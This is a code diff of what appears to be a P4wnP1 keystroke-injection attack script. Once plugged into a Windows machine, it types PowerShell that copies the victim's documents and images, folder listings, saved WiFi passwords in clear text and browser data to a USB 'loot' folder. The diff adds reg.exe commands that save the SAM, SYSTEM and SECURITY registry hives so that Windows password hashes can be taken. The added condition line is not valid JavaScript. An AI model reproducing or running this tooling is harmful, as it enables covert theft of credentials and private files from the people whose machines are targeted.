@@ -1,7 +1,9 @@
 /*#########################################################################################################################################\
 # AllinOne_extraction.js														   #
-# Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords and browsing history/bookmarks/logs      #
-# Author: chriskalv                                                                                                                        #
+#   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs       #
+#   and Windows credential databases (SAM, system and security files).									   #
+#																	   #
+#   Author: chriskalv                                                                                                                      #
 #													                                   #
 # PREREQUISTES:                                                                                                                            #
 # - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
@@ -18,7 +20,7 @@ run_as_admin=false;					           // Set to true to execute powershell as Admin
 hide=false; 			                                   // Set to true to hide the console window on the target
 exit=true;			                                   // Set to true to exit the console once finished
 var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
-// FILE EXTRACTION              				   // ---
+// FILES EXTRACTION              				   // ---
 extract_files=true;						   // Set to true to enable the extraction of files
 extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
@@ -26,13 +28,15 @@ var user_subfolder2 = ["Downloads"]                                // The second
 var filetypes_user = ["pdf", "jpg", "png"]                         // The filetypes to extract from previously specified folders in the home directory
 var add_folder = "SoftwareXYZ\\subfolder1\\subfolder2"             // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
 var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
-// WIFI EXTRACTION					           // ---
+// WIFI DATA EXTRACTION					           // ---
 extract_wifi=true;						   // Set to true to enable the extraction of WiFi keys
 var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
 // BROWSER DATA EXTRACTION					   // ---
 extract_browserdata=false;					   // Set to true to enable the extraction of browser data (history, bookmarks, logs)
-// HOME DIRECTORY FILES/FOLDER STRUCTURE			   // ---
+// HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION		   // ---
 extract_folderstructure=true;					   // Set to true to enable the extraction of the home directory folder/files structure
+// WINDOWS CREDENTIALS EXTRACTION				   // ---
+extract_wincreds=false;						   // Set to true to enable the extraction of Windows credentials dbs (powershell must be run as admin)
 ////////////////////////////////////////////////////////////////////
 
 // Definition of other variables, arrays, ...
@@ -76,6 +80,7 @@ function attack() {
     if (extract_folderstructure) type("$lootPathFolders = $usbPath+ '' +$lootfolder+ '\\folder_structure\';mkdir $lootPathFolders;");
     if (extract_browserdata) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\browser_data\';mkdir $lootPathBrowser;");
     if (extract_wifi) type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
+    if (extract_wincreds) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
     if (extract_add_folder) type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");  
     delay(100);
   
@@ -103,6 +108,14 @@ function attack() {
         type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");
         type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
         delay(2000)
+    }
+	
+  // Extract Windows credentials
+    if (extract_wincreds) && (run_as_admin) {
+	type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
+        type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
+        type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
+	delay(4000)
     }
    
   // Copy files of specified filetypes from specified folders (depth: 3 directories)
